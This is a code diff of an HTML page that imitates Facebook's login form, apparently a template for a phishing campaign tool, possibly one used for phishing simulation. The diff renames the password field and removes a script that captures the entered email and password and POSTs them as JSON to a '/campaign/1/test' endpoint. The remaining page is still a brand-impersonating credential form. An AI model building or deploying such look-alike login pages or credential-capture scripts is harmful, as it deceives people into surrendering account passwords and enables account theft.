@@ -14,41 +14,11 @@
         <h2>Facebook Login</h2>
         <form id="loginForm" method="POST">
             <input type="text" name="email" placeholder="Email or phone number" required>
-            <input type="password" name="pass" placeholder="Password" required>
+            <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
         </form>
     </div>
 
 </body>
-<script>
-    document.getElementById("loginForm").addEventListener("submit", async function(event) {
-        event.preventDefault(); 
 
-        const email = document.querySelector('input[name="email"]').value;
-        const password = document.querySelector('input[name="pass"]').value;
-
-        const data = {
-            email: email,
-            password: password
-        };
-    try {
-    const response = await fetch('/campaign/1/test', 
-        {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json', 
-            },
-                body: JSON.stringify(data), 
-            });
-
-            if (response.ok) {
-                console.log("Login successful!");
-            } else {      
-                console.log("Login failed!");
-            }
-            } catch (error) {
-                console.log("There was an error with the request.");
-            }
-        });
-</script>
 </html>
